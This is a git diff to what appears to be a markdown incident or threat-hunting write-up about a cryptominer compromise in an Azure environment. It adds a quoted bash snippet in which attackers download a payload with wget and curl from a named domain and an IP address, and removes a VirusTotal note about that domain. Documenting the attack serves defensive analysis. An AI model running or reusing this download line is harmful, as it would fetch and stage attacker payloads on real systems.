@@ -885,6 +885,21 @@ Miner
 
 <br>
 
+
+```bash
+    # --- Download payload from fallback domains ---
+    wget -q dinpasiune.com/payload \
+      || curl -O -s -L dinpasiune.com/payload \
+      || wget 85.31.47.99/payload \
+      || curl -O -s -L 85.31.47.99/payload
+```
+
+<br>
+
+<img width="1264" height="644" alt="image" src="https://github.com/user-attachments/assets/a1ddd61f-0cfc-4b63-86ef-744a87475176"> 
+  
+  <br>
+
 ---
 
 ## Cloud Provider Disables Azure VNet
@@ -983,12 +998,8 @@ DeviceNetworkEvents
 <img width="2268" height="477" alt="image" src="https://github.com/user-attachments/assets/e9ed6153-4b81-4090-9b18-8e1fe2dc5462" />
 
 
-<img width="981" height="271" alt="image" src="https://github.com/user-attachments/assets/266d4ff8-15a4-4b1e-9e64-598347cc6fb4" />
 
-virusttal dinpasiuneDOTcom
-among communicating files: retea & diicot
 
-<img width="1264" height="644" alt="image" src="https://github.com/user-attachments/assets/a1ddd61f-0cfc-4b63-86ef-744a87475176" />
 
 
 
